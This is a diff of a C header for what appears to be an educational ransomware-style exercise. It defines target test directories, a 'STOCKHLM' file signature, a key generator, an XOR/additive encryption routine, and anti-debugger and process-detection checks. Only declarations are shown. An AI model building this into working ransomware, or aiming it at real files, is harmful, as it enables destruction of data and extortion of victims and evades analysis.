@@ -12,6 +12,7 @@
 # include <time.h>      // For rand & srand (encryption key generation)
 # include <dirent.h>    // For looping through directory
 # include <stdbool.h>
+# include <sys/stat.h>  // For checking if directory
 
 /*-------------------------------- Colors ---------------------------------*/
 
@@ -26,13 +27,18 @@
 
 /*------------------------ Defines, enum, struct --------------------------*/
 
-# define FA_TARGET_ARRAY_SIZE   2
 // Paths of the target directories
-# define FA_TARGET_PATHS        {"/tmp/test/", "/tmp/test2/"}
+# define FA_TARGET_ARRAY_SIZE   2
+# define FA_TARGET_PATHS        { "/tmp/test/", "/tmp/test2/" }
+
+// Unhandled paths
+# define FA_UNHANDLED_DIRS_ARRAY_SIZE   2
+# define FA_UNHANDLED_DIRS      { ".", ".." }
+
 // Error code
 # define FA_ERROR               1
-// Common value representing the size of a memory page in many computer systems
-# define FA_PAGE_SIZE           4096
+// Maximum amount of handled files on a directory
+# define FA_MAX_FILES           1024
 
 // Charset used for the encryption key
 # define FA_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
@@ -40,7 +46,7 @@
                                 "0123456789"
 // Signature injected in the target files's Stockholm header
 # define FA_SIGNATURE           "STOCKHLM"
-# define FA_STOCKHLM_EXT        ".ft"
+# define FA_STOCKHLM_EXT        "ft"
 # define FA_STOCKHLM_EXT_LEN    3
 
 enum fa_e_modes
@@ -117,12 +123,13 @@ extern fa_t_stockhlm_header g_stockhlm_header;
 char    *fa_get_filename(char *argv[]);
 int     fa_map_file_into_memory(const char *filename);
 int     fa_process_mapped_data(void);
-int     fa_write_processed_data_to_file(char *target_path);
+int     fa_write_processed_data_to_file(const char *target_path);
 void    xor_with_additive_cipher(
     void *key, size_t key_length, void *data, size_t data_length, int mode);
 char    *fa_keygen(const char *_charset, size_t strength);
 void    fa_parse_argv(char *argv[]);
 int     pc_is_debugger_attached(void);
 int     pc_is_process_running(const char *process_name);
+bool    is_extension_handled(char *filepath);
 
 #endif
